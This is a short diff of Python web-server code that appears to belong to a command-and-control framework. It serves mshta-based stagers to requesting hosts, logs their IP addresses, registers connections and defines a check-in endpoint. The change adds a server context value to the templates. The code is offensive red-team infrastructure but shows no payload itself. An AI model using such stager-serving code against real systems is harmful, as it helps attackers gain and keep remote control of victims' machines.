@@ -19,8 +19,8 @@ def serve_stagers(format_id):
     color.information(f'{stager.format} file requested ({remote_addr})')
     connection = engine.create_connection(stager)
     connection.system_information['ip'] = remote_addr
-    mshta_code = parse.quote(render_template(f'mshta/code.mshta', variables = stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri))
-    return render_template(f'{stager.format}/stager.{stager.format}', checkin_uri = checkin_uri, variables = stager.variables, mshta_code = mshta_code, random_string = util.generate_str(), connection_id = connection.connection_id)
+    mshta_code = parse.quote(render_template(f'mshta/code.mshta', variables = stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context()))
+    return render_template(f'{stager.format}/stager.{stager.format}', checkin_uri = checkin_uri, variables = stager.variables, mshta_code = mshta_code, random_string = util.generate_str(), connection_id = connection.connection_id, server_context = util.server_context())
 
 @app.route(f'{checkin_uri}', methods=['POST'])
 def checkin():
